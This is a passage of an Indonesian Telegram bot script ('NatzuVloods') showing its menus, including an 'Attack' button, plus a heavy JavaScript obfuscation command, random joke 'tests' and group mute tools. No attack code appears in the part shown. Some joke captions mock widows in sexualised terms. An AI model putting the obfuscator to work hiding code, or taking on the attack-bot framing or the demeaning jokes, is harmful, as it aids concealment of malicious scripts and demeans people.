<blockquote>Developer @Rappzmodzz</blockquote>
`;
      newButtons = [[{ text: "🔙 Kembali", callback_data: "mainmenu" }]];
      break;

    case "ownermenu":
      newCaption = `
<blockquote>☰ 𝐓𝐇𝐄 𝐀𝐂𝐂𝐄𝐒</blockquote>
━━━━━━━━━━━━━━━━━━
⬡ /addprem ID Time
⬡ /delprem ID
⬡ /listprem
⬡ /addadmin ID
⬡ /deladmin ID
⬡ /addbot Menghubungkan Sender
⬡ /gconly on/off
⬡ /on Membuka Cmd Start
⬡ /off Menutup Cmd Start
━━━━━━━━━━━━━━━━━━
<blockquote>Developer @Rappzmodzz</blockquote>
`;
      newButtons = [[{ text: "🔙 Kembali", callback_data: "mainmenu" }]];
      break;

    case "thanksto":
      newCaption = `
<blockquote>☰ 𝐓𝐇𝐄 𝐅𝐑𝐈𝐄𝐍𝐃</blockquote>
━━━━━━━━━━━━━━━━━━
⨭ @Rappzmodzz ( Developer ) 
━━━━━━━━━━━━━━━━━━
<blockquote>Developer @Rappzmodzz</blockquote>
`;
      newButtons = [[{ text: "🔙 Kembali", callback_data: "mainmenu" }]];
      break;

    case "toolsmenu1":
      newCaption = `
<blockquote>☰ 𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔</blockquote>
━━━━━━━━━━━━━━━━━━
⬡ /Tourl ➤ Media
⬡ /Brat ➤ Teks
⬡ /Iqc ➤ Perintah
⬡ /Quote ➤ Motifasi
⬡ /cekmiskin ➤ Reply/Tag
⬡ /cekkaya ➤ Reply/Tag
⬡ /cekpacar ➤ Name
⬡ /cektampan ➤ Name
⬡ /cekcantik ➤ Name
⬡ /cekjanda ➤ Name
━━━━━━━━━━━━━━━━━━
<blockquote>Gunakan tombol di bawah untuk memulai!</blockquote>
`;
      newButtons = [
        [{ text: "🔙 Kembali", callback_data: "mainmenu" }],
        [
          { text: "Group Only", callback_data: "toolsmenu2" },
          { text: "Encrypt", callback_data: "toolsmenu3" }
        ]
      ];
      break;

    case "toolsmenu2":
      newCaption = `
<blockquote>☰ 𝐓𝐎𝐎𝐋𝐒 𝐌𝐃</blockquote>
━━━━━━━━━━━━━━━━━━
⬡ /Open ➤ Open Group
⬡ /Close ➤ Close Grouo
⬡ /mute ➤ Mute Member
⬡ /unmute ➤ Unmute Member
⬡ /cekid ➤ Cek Id
⬡ /antilink on ➤ Anti Link On
⬡ /antilink off ➤ Antu Link Off
⬡ /setcd ➤ Set Jeda
━━━━━━━━━━━━━━━━━━
<blockquote>Gunakan tombol di bawah untuk memulai!</blockquote>
`;
      newButtons = [
        [{ text: "🔙 Kembali", callback_data: "toolsmenu1" }],
        [
          { text: "Group Only", callback_data: "toolsmenu2" },
          { text: "Encrypt", callback_data: "toolsmenu3" }
        ]
      ];
      break;

    case "toolsmenu3":
      newCaption = `
<blockquote>☰ 𝐓𝐎𝐎𝐋𝐒 𝐓𝐇𝐈𝐑𝐃</blockquote>
━━━━━━━━━━━━━━━━━━
⬡ /nulis ➤ Kata Mu
⬡ /Done ➤ Trx
⬡ /Brat ➤ Pinky Only
⬡ /translate ➤ Terjemahkan
⬡ /Encrypt ➤ File Js Only
⬡ /Tiktok ➤ Kata Kunci
⬡ /mediafire ➤ Url
━━━━━━━━━━━━━━━━━━
<blockquote>Gunakan tombol di bawah untuk Memulai!</blockquote>
`;
      newButtons = [
        [{ text: "🔙 Kembali", callback_data: "toolsmenu1" }],
        [
          { text: "Group Only", callback_data: "toolsmenu2" },
          { text: "Encrypt", callback_data: "toolsmenu3" }
        ]
      ];
      break;

    case "mainmenu":
      newCaption = `
<blockquote>─  ( 🕸 ) 안녕하세요 ${username}, 저는 @Rappzmodzz 가 창조한 NATZU VLOODS입니다. 저는 여기에서 당신의 모든 적을 섬멸하고 당신을 돕고 싶습니다.
━━━━━━━━━━━━━━━━━━
⨭ Developer : @Rappzmodzz
⨭ Chanel : @aboutrappz
⨭ Prefix : ./
⨭ Script : NatzuVloods
⨭ Version : 3.0.0 Beta
⨭ Time : ${runtime}
━━━━━━━━━━━━━━━━━━
<blockquote>Select The Button Here!</blockquote>
`;
      newButtons = [
        [
          { text: "Attack💣", callback_data: "bugshow" },
          { text: "Controll🛠", callback_data: "ownermenu" }
        ],
        [
          { text: "ThanksTo🫂", callback_data: "thanksto" },
          { text: "Games🎮", callback_data: "toolsmenu1" }
        ],
        [{ text: "About🪁", url: "https://t.me/aboutrappz" }]
      ];
      break;
  }

  // === EDIT PESAN ===
  try {
    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomImage,
        caption: newCaption,
        parse_mode: "HTML"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: { inline_keyboard: newButtons }
      }
    );
  } catch (err) {
    if (err.response?.body?.description?.includes("message is not modified")) {
      await bot.answerCallbackQuery(query.id, {
        text: "⚠️ Sudah di menu ini.",
        show_alert: false
      });
    } else {
      console.error("❌ Gagal edit media:", err);
    }
  }

  await bot.answerCallbackQuery(query.id);
});


/// --- ( Parameter ) --- \\\


// ================= CEK PREMIUM =================
const isPremiumUser = (id) => premiumUsers.some(u => u.id.toString() === id.toString());

function generateProgressBar(percent, length = 20) {
  const filledLength = Math.round((percent / 100) * length);
  const emptyLength = length - filledLength;
  return "█".repeat(filledLength) + "░".repeat(emptyLength) + ` ${percent}%`;
}

async function isBotAdmin(chatId) {
  try {
    const botMember = await bot.getChatMember(chatId, (await bot.getMe()).id);
    return ["administrator", "creator"].includes(botMember.status);
  } catch (err) {
    console.error("Gagal cek admin bot:", err);
    return false;
  }
}

function escapeMarkdownV2(text) {
  if (!text) return "";
  return text.toString().replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, "\\$1");
}

function escapeMarkdown(text) {
  if (!text) return "";
  return text.replace(/([_*`\[])/g, "\\$1");
}

// ================= COMMAND: TOOLS ===============
bot.onText(/^\/setcd (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // cek apakah yang pakai owner
    if (!config.OWNER_ID.map(Number).includes(fromId)) {
        return bot.sendMessage(chatId, "❌ Hanya Owner yang bisa mengatur cooldown!");
    }

    const timeString = match[1].trim();
    const result = setCooldown(timeString);

    bot.sendMessage(chatId, result);
});

bot.onText(/\/Encrypt/, async (msg) => {
    const chatId = msg.chat.id;
    const replyMessage = msg.reply_to_message;

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return bot.sendMessage(chatId, '😡 Silakan Balas/Tag File .js\nBiar Gua Gak Salah Tolol.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    const fileLink = await bot.getFileLink(fileId);
    const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
    const codeBuffer = Buffer.from(response.data);

    const tempFilePath = `./@LolipopXR${fileName}`;
    fs.writeFileSync(tempFilePath, codeBuffer);

    // Kirim pesan awal
    const loadingMsg = await bot.sendMessage(
        chatId,
        "```🍭Encrypt Lolipop...\n[░░░░░░░░░░] 0%```",
        { parse_mode: "MarkdownV2" }
    );

    let isEncrypting = true;
    let i = 0;
    let forward = true;
    const steps = 10;

    // Progress pakai setInterval (non-blocking)
    const interval = setInterval(async () => {
        if (!isEncrypting) {
            clearInterval(interval);
            return;
        }

        const bar = "🍬".repeat(i) + "░".repeat(steps - i); // pakai emoji permen 🍬
        const percent = Math.round((i / steps) * 100);

        try {
            await bot.editMessageText(
                "```🧭Encrypt Natzu..\n[" + bar + "] " + percent + "%```",
                { chat_id: chatId, message_id: loadingMsg.message_id, parse_mode: "MarkdownV2" }
            );
        } catch (err) { }

        forward ? i++ : i--;
        if (i >= steps) forward = false;
        if (i <= 0) forward = true;
    }, 300);

    // === Proses Encrypt ===
    const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        stringEncoding: true,
        stringConcealing: true,
        stringCompression: true,
        renameVariables: true,
        renameGlobals: true,
        controlFlowFlattening: 1.0,
        opaquePredicates: 0.9,
        dispatcher: true,
        hexadecimalNumbers: true,
        globalConcealing: true
    });

    const encryptedFilePath = `./NatzuEncrypt${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);

    // Matikan progress bar
    isEncrypting = false;

    // Update pesan jadi success
    await bot.editMessageText(
        "```🔐Encrypt Selesai!```",
        { chat_id: chatId, message_id: loadingMsg.message_id, parse_mode: "MarkdownV2" }
    );

    // Kirim file hasil encrypt
    await bot.sendDocument(chatId, encryptedFilePath, {
        caption: `\`\`\`txt
❒──────⌦ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 ⌫──────❒
│  File berhasil terenkripsi
❒──────────────────────❒
\`\`\``,
        parse_mode: "MarkdownV2"
    });
});

function komentarTampan(nilai) {
  if (nilai >= 100) return "💎 Ganteng dewa, mustahil diciptakan ulang.";
  if (nilai >= 94) return "🔥 Ganteng gila! Mirip artis Korea!";
  if (nilai >= 90) return "😎 Bintang iklan skincare!";
  if (nilai >= 83) return "✨ Wajahmu memantulkan sinar kebahagiaan.";
  if (nilai >= 78) return "🧼 Bersih dan rapih, cocok jadi influencer!";
  if (nilai >= 73) return "🆒 Ganteng natural, no filter!";
  if (nilai >= 68) return "😉 Banyak yang naksir nih kayaknya.";
  if (nilai >= 54) return "🙂 Lumayan sih... asal jangan senyum terus.";
  if (nilai >= 50) return "😐 Gantengnya malu-malu.";
  if (nilai >= 45) return "😬 Masih bisa lah asal percaya diri.";
  if (nilai >= 35) return "🤔 Hmm... mungkin bukan harinya.";
  if (nilai >= 30) return "🫥 Sedikit upgrade skincare boleh tuh.";
  if (nilai >= 20) return "🫣 Coba pose dari sudut lain?";
  if (nilai >= 10) return "😭 Yang penting akhlaknya ya...";
  return "😵 Gagal di wajah, semoga menang di hati.";
}

function komentarCantik(nilai) {
  if (nilai >= 100) return "👑 Cantiknya level dewi Olympus!";
  if (nilai >= 94) return "🌟 Glowing parah! Bikin semua iri!";
  if (nilai >= 90) return "💃 Jalan aja kayak jalan di runway!";
  if (nilai >= 83) return "✨ Inner & outer beauty combo!";
  if (nilai >= 78) return "💅 Cantik ala aesthetic tiktok!";
  if (nilai >= 73) return "😊 Manis dan mempesona!";
  if (nilai >= 68) return "😍 Bisa jadi idol nih!";
  if (nilai >= 54) return "😌 Cantik-cantik adem.";
  if (nilai >= 50) return "😐 Masih oke, tapi bisa lebih wow.";
  if (nilai >= 45) return "😬 Coba lighting lebih terang deh.";
  if (nilai >= 35) return "🤔 Unik sih... kayak seni modern.";
  if (nilai >= 30) return "🫥 Banyak yang lebih butuh makeup.";
  if (nilai >= 20) return "🫣 Mungkin inner beauty aja ya.";
  if (nilai >= 10) return "😭 Cinta itu buta kok.";
  return "😵 Semoga kamu lucu pas bayi.";
}

// /cektampan
command(/^\/cektampan$/, async (msg) => {
  const chatId = msg.chat.id;

  // Cek premium
  if (!isPremiumUser(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Fitur ini hanya untuk Premium User!", { parse_mode: "Markdown" });
  }

  // Random nilai
  const arrNilai = [10, 20, 30, 35, 45, 50, 54, 68, 73, 78, 83, 90, 94, 100];
  const nilai = arrNilai[Math.floor(Math.random() * arrNilai.length)];

  // Format pesan dengan blok kode
  const teks = "```\n" +
    "📊 Hasil Tes Ketampanan\n" +
    `👤 Nama: ${escapeMarkdownV2(msg.from.first_name)}\n` +
    `💯 Nilai: ${nilai}%\n` +
    `🗣️ Komentar: ${escapeMarkdownV2(komentarTampan(nilai))}\n` +
    "```";

  // Kirim pesan
  bot.sendMessage(chatId, teks, { parse_mode: "MarkdownV2" });
});

// /cekcantik
command(/^\/cekcantik$/, async (msg) => {
  const chatId = msg.chat.id;

  // Cek premium
  if (!isPremiumUser(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Fitur ini hanya untuk Premium User!", { parse_mode: "Markdown" });
  }

  // Random nilai
  const arrNilai = [10, 20, 30, 35, 45, 50, 54, 68, 73, 78, 83, 90, 94, 100];
  const nilai = arrNilai[Math.floor(Math.random() * arrNilai.length)];

  // Format pesan
  const teks = "```\n" +
    "📊 Hasil Tes Kecantikan\n" +
    `👤 Nama: ${escapeMarkdownV2(msg.from.first_name)}\n` +
    `💯 Nilai: ${nilai}%\n` +
    `🗣️ Komentar: ${escapeMarkdownV2(komentarCantik(nilai))}\n` +
    "```";

  // Kirim pesan
  bot.sendMessage(chatId, teks, { parse_mode: "MarkdownV2" });
});

// Nilai dan komentar untuk kekayaan
function komentarKaya(nilai) {
  if (nilai >= 100) return "💎 Sultan auto endorse siapa aja.";
  if (nilai >= 90) return "🛥️ Jet pribadi parkir di halaman rumah.";
  if (nilai >= 80) return "🏰 Rumahnya bisa buat konser.";
  if (nilai >= 70) return "💼 Bos besar! Duit ngalir terus.";
  if (nilai >= 60) return "🤑 Kaya banget, no debat.";
  if (nilai >= 50) return "💸 Kaya, tapi masih waras.";
  if (nilai >= 40) return "💳 Lumayan lah, saldo aman.";
  if (nilai >= 30) return "🏦 Kayanya sih... dari tampang.";
  if (nilai >= 20) return "🤔 Cukup buat traktir kopi.";
  if (nilai >= 10) return "🫠 Kaya hati, bukan dompet.";
  return "🙃 Duitnya imajinasi aja kayaknya.";
}

// Nilai dan komentar untuk kemiskinan
function komentarMiskin(nilai) {
  if (nilai >= 100) return "💀 Miskin absolut, utang warisan.";
  if (nilai >= 90) return "🥹 Mau beli gorengan mikir 3x.";
  if (nilai >= 80) return "😩 Isi dompet: angin & harapan.";
  if (nilai >= 70) return "😭 Bayar parkir aja utang.";
  if (nilai >= 60) return "🫥 Pernah beli pulsa receh?";
  if (nilai >= 50) return "😬 Makan indomie aja dibagi dua.";
  if (nilai >= 40) return "😅 Listrik token 5 ribu doang.";
  if (nilai >= 30) return "😔 Sering nanya *gratis ga nih?*";
  if (nilai >= 20) return "🫣 Semoga dapet bansos.";
  if (nilai >= 10) return "🥲 Yang penting hidup.";
  return "😵 Gaji = 0, tagihan = tak terbatas.";
}

// /cekkaya
command(/^\/cekkaya$/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isPremiumUser(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Fitur ini hanya untuk Premium User!", { parse_mode: "Markdown" });
  }

  const arrNilai = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100];
  const nilai = arrNilai[Math.floor(Math.random() * arrNilai.length)];

  const teks = "```\n" +
    "💵 Tes Kekayaan\n" +
    `👤 Nama: ${escapeMarkdownV2(msg.from.first_name)}\n` +
    `💰 Nilai: ${nilai}%\n` +
    `🗣️ Komentar: ${escapeMarkdownV2(komentarKaya(nilai))}\n` +
    "```";

  bot.sendMessage(chatId, teks, { parse_mode: "MarkdownV2" });
});

// /cekmiskin
command(/^\/cekmiskin$/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isPremiumUser(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Fitur ini hanya untuk Premium User!", { parse_mode: "Markdown" });
  }

  const arrNilai = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100];
  const nilai = arrNilai[Math.floor(Math.random() * arrNilai.length)];

  const teks = "```\n" +
    "📉 Tes Kemiskinan\n" +
    `👤 Nama: ${escapeMarkdownV2(msg.from.first_name)}\n` +
    `📉 Nilai: ${nilai}%\n` +
    `🗣️ Komentar: ${escapeMarkdownV2(komentarMiskin(nilai))}\n` +
    "```";

  bot.sendMessage(chatId, teks, { parse_mode: "MarkdownV2" });
});

// Fungsi komentar berdasarkan skor
function komentarJanda(nilai) {
  if (nilai >= 100) return "🔥 Janda premium, banyak yang ngantri.";
  if (nilai >= 90) return "💋 Bekas tapi masih segel.";
  if (nilai >= 80) return "🛵 Banyak yang ngajak balikan.";
  if (nilai >= 70) return "🌶️ Janda beranak dua, laku keras.";
  if (nilai >= 60) return "🧕 Pernah disakiti, sekarang bersinar.";
  if (nilai >= 50) return "🪞 Masih suka upload status galau.";
  if (nilai >= 40) return "🧍‍♀️ Janda low-profile.";
  if (nilai >= 30) return "💔 Ditinggal pas lagi sayang-sayangnya.";
  if (nilai >= 20) return "🫥 Baru ditinggal, masih labil.";
  if (nilai >= 10) return "🥲 Janda lokal, perlu support moral.";
  return "🚫 Masih istri orang, bro.";
}

// /cekjanda
command(/^\/cekjanda$/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isPremiumUser(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Fitur ini hanya untuk Premium User!", { parse_mode: "Markdown" });
  }

  const nilai = Math.floor(Math.random() * 101); // 0 - 100

  const teks = "```\n" +
    "👠 Tes Kejandaan\n" +
    `👤 Nama: ${escapeMarkdownV2(msg.from.first_name)}\n` +
    `📊 Nilai: ${nilai}%\n` +
    `🗣️ Komentar: ${escapeMarkdownV2(komentarJanda(nilai))}\n` +
    "```";

  bot.sendMessage(chatId, teks, { parse_mode: "MarkdownV2" });
});

// Fungsi komentar sesuai skor pacar
function komentarPacar(nilai) {
  if (nilai >= 95) return "💍 Sudah tunangan, tinggal nikah.";
  if (nilai >= 85) return "❤️ Pacaran sehat, udah 3 tahun lebih.";
  if (nilai >= 70) return "😍 Lagi anget-angetnya.";
  if (nilai >= 60) return "😘 Sering video call tiap malam.";
  if (nilai >= 50) return "🫶 Saling sayang, tapi LDR.";
  if (nilai >= 40) return "😶 Dibilang pacaran, belum tentu. Tapi dibilang nggak, juga iya.";
  if (nilai >= 30) return "😅 Masih PDKT, nunggu sinyal.";
  if (nilai >= 20) return "🥲 Sering ngechat, tapi dicuekin.";
  if (nilai >= 10) return "🫠 Naksir diam-diam.";
  return "❌ Jomblo murni, nggak ada harapan sementara ini.";
}

// Command /cekpacar
command(/^\/cekpacar$/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isPremiumUser(msg.from.id)) {
    return bot.sendMessage(chatId, "❌ Fitur ini hanya untuk Premium User!", { parse_mode: "Markdown" });
  }

  const nilai = Math.floor(Math.random() * 101); // 0 - 100

  const teks = "```\n" +
    "💕 Tes Kepacaran\n" +
    `👤 Nama: ${escapeMarkdownV2(msg.from.first_name)}\n` +
    `📊 Nilai: ${nilai}%\n` +
    `🗣️ Komentar: ${escapeMarkdownV2(komentarPacar(nilai))}\n` +
    "```";

  bot.sendMessage(chatId, teks, { parse_mode: "MarkdownV2" });
});
//CEKRANDOM
command(/^\/mute$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
   
    if (!isPremiumUser(msg.from.id)) 
    return bot.sendMessage(chatId, "❌ Fitur ini hanya untuk Premium User!", { parse_mode: "Markdown" });

    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-mute.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        await bot.restrictChatMember(chatId, targetUser.id, {
            permissions: {
                can_send_messages: false,
                can_send_media_messages: false,
                can_send_polls: false,
                can_send_other_messages: false,
                can_add_web_page_previews: false,
                can_change_info: false,
                can_invite_users: false,
                can_pin_messages: false
            }
        });

        await bot.sendMessage(chatId,
            `🍭 Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) Hahaha Mampus Kena mute.`,
            { parse_mode: 'Markdown' });

        await bot.sendMessage(chatId,
            '🚫 Pengguna telah di-mute di grup ini oleh admin.',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat mute:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan mute.');
    }
});

command(/^\/unmute$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    
    if (!config.OWNER_ID.map(Number).includes(fromId)) {
        return bot.sendMessage(chatId, "❌ Hanya Owner yang bisa mengatur cooldown!");
    }
    
    if (!isPremiumUser(msg.from.id)) 
    return bot.sendMessage(chatId, "❌ Fitur ini hanya untuk Premium User!", { parse_mode: "Markdown" });

    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-unmute.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        await bot.restrictChatMember(chatId, targetUser.id, {
            permissions: {
                can_send_messages: true,
                can_send_media_messages: true,
                can_send_polls: true,
                can_send_other_messages: true,
                can_add_web_page_previews: true,
                can_invite_users: true,
                can_pin_messages: false,
                can_change_info: false
            }
        });

        await bot.sendMessage(chatId,
            `🍭 Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-unmute.`,
            { parse_mode: 'Markdown' });

        await bot.sendMessage(chatId,
            '🔊 Pengguna telah di-unmute di grup ini, silakan mengobrol kembali.',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat unmute:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan unmute.');
    }
});

let enabled = true;

async function showProgress(chatId, messageId, steps = 10, delay = 500) {
  for (let i = 1; i <= steps; i++) {
    const bar = '▓'.repeat(i) + '░'.repeat(steps - i);
    const text = `⌛ Sedang memproses...\n[${bar}] ${i * 10}%`;

    try {
      await bot.editMessageText(text, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown"
      });
    } catch (err) {
      console.error("❌ Gagal edit:", err.response?.body?.description || err.message);
      break;
    }

    await new Promise(r => setTimeout(r, delay));
  }

  await bot.editMessageText("✅ Selesai!", {
    chat_id: chatId,
    message_id: messageId
  });
}

command(/^\/nulis(?:\s+(.+))?/, async (msg, match) => {
  if (!enabled) return;

  const chatId = msg.chat.id;
  const text = match[1];

  if (!isPremiumUser(msg.from.id)) 
    return bot.sendMessage(chatId, "❌ Fitur ini hanya untuk Premium User!", { parse_mode: "Markdown" });

  if (!text) {
    return bot.sendMessage(chatId, "Mau nulis apa? Contoh:\n/nulis aku sayang kamu");
  }

  try {
    const progressMessage = await bot.sendMessage(chatId, "⌛ Sedang menulis...\n[░░░░░]");

    await showProgress(chatId, progressMessage.message_id, 5, 400);

    const response = await axios.post(
      "https://lemon-write.vercel.app/api/generate-book",
      {
        text,
        font: "default",
        color: "#000000",
        size: "32",
      },
      {
        responseType: "arraybuffer",
        headers: { "Content-Type": "application/json" },
      }
    );

    await bot.deleteMessage(chatId, progressMessage.message_id);

    await bot.sendPhoto(chatId, Buffer.from(response.data));
  } catch (error) {
    console.error("Nulis error:", error.message);
    bot.sendMessage(chatId, "❌ Error, coba lagi nanti ya.");
  }
});

command(/^\/Done(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const input = match?.[1];

  if (!isPremiumUser(userId))
    return bot.sendMessage(chatId, "❌ Fitur ini hanya untuk Premium User!", { parse_mode: "Markdown" });

  if (!input) {
    return bot.sendMessage(
      chatId,
      "📌 *Gunakan format yang benar!*\n\nContoh:\n/Done jasa install panel,15000,Dana",
      { parse_mode: "Markdown" }
    );
  }

  const [namaBarang, hargaBarang, metodeBayar] = input.split(",").map(part => part?.trim());
  if (!namaBarang || !hargaBarang) {
    return bot.sendMessage(
      chatId,
      "❗ Format salah. Minimal harus ada nama barang dan harga.\nContoh:\n/Done jasa install panel,15000,Dana",
      { parse_mode: "Markdown" }
    );
  }

  const hargaFormatted = `Rp${Number(hargaBarang).toLocaleString("id-ID")}`;
  const metodePembayaran = metodeBayar || "Tidak disebutkan";
  const now = new Date().toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  });

  bot.sendPhoto(chatId, "https://files.catbox.moe/15d6qa.jpg", {
    caption: ` \`\`\`
✅ Transaksi Selesai\`\`\`
\`\`\`
📦 Barang: ${namaBarang}
💳 Harga: ${hargaFormatted}
💰 Pembayaran: ${metodePembayaran}
⏰ Waktu: ${now}
\`\`\`
`,
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Information", url: "https://t.me/aboutrappz" }, { text: "developer", url: "https://t.me/Rappzmodzz" }],
      ]
    }
  });
});

command(/^\/Brat(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];
  
  if (!isPremiumUser(msg.from.id)) 
    return bot.sendMessage(chatId, "❌ Fitur ini hanya untuk Premium User!", { parse_mode: "Markdown" });

  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /Brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});

const LANGUAGES = {
  en: "🇬🇧 English",
  id: "🇮🇩 Indonesia",
  ar: "🇸🇦 Arabic",
  es: "🇪🇸 Spanish",
  fr: "🇫🇷 French",
  de: "🇩🇪 German",
  ja: "🇯🇵 Japanese",
  ru: "🇷🇺 Russian",
  zh: "🇨🇳 Chinese"
};

const API_URL = 'https://libretranslate.com/translate';

// Command translate
command(/^\/translate(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const textArg = match[1];
  const replyText = msg.reply_to_message?.text;

  const textToTranslate = textArg || replyText;

  if (!isPremiumUser(userId)) {
    return bot.sendMessage(chatId, "❌ Fitur ini hanya untuk Premium User!", { parse_mode: "Markdown" });
  }

  if (!textToTranslate) {
    return bot.sendMessage(chatId, '💡 Gunakan: `/translate teks` atau balas pesan dengan `/translate`.', { parse_mode: 'Markdown' });
  }

  const langButtons = Object.entries(LANGUAGES).map(([code, name]) => ([{
    text: name, callback_data: `translateto:${code}|${encodeURIComponent(textToTranslate)}`
  }]));

  await bot.sendMessage(chatId, '🌐 Pilih bahasa tujuan:', {
    reply_markup: { inline_keyboard: langButtons },
  });
});

// Callback untuk inline keyboard
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const msgId = query.message.message_id;

  if (!query.data.startsWith('translateto:')) return;

  const [, payload] = query.data.split(':');
  const [targetLang, encodedText] = payload.split('|');
  const originalText = decodeURIComponent(encodedText);

  try {
    await bot.answerCallbackQuery(query.id, { text: '⏳ Menerjemahkan...' });

    const res = await axios.post(API_URL, {
      q: originalText,
      source: 'auto',
      target: targetLang,
      format: 'text'
    });

    const translated = res.data.translatedText;

    await bot.editMessageText(
      `\`\`\`📝 Original: ${escapeMarkdown(originalText)}\n\n🌍 Translated (${LANGUAGES[targetLang]}):\n${escapeMarkdown(translated)}\`\`\``,
      {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: 'MarkdownV2'
      }
    );
  } catch (err) {
    console.error(err);
    await bot.answerCallbackQuery(query.id, { text: '⚠️ Gagal menerjemahkan.', show_alert: true });
  }
});

// ================= COMMAND: OPEN =================);
command(/^\/Open$/, async (msg) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  // Cek Owner
  const isOwner = config.OWNER_ID.map(Number).includes(fromId);
  if (!isOwner) {
    // Kirim notif ke user dan log ke console jika perlu
    await bot.sendMessage(chatId, "❌ Hanya Owner yang bisa menggunakan command ini!");
    console.log(`User ${fromId} mencoba menggunakan /Open tapi bukan Owner.`);
    return; // Stop eksekusi command
  }

  // Cek jika command dijalankan di private chat
  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "❌ Command ini hanya bisa digunakan di grup.");
  }

  // Cek Premium User
  if (!isPremiumUser(fromId)) {
    return bot.sendMessage(chatId, "❌ Fitur ini hanya untuk Premium User!", { parse_mode: "Markdown" });
  }

  // Cek Bot Admin
  if (!(await isBotAdmin(chatId))) {
    return bot.sendMessage(chatId, "❌ Bot harus menjadi admin untuk membuka grup!");
  }

  // Proses membuka grup dengan progress bar
  let percent = 0;
  const processingMsg = await bot.sendMessage(chatId, `⏳ Membuka grup\n[${generateProgressBar(percent)}]`);
  const intervalId = setInterval(() => {
    percent += 5;
    if (percent > 100) percent = 100;

    bot.editMessageText(`⏳ Membuka grup\n[${generateProgressBar(percent)}]`, {
      chat_id: chatId,
      message_id: processingMsg.message_id
    }).catch(() => {});

    if (percent >= 100) clearInterval(intervalId);
  }, 500);

  try {
    await bot.setChatPermissions(chatId, {
      can_send_messages: true,
      can_send_media_messages: true,
      can_send_polls: true,
      can_send_other_messages: true,
      can_add_web_page_previews: true,
      can_change_info: false,
      can_invite_users: true,
      can_pin_messages: false
    });

    clearInterval(intervalId);

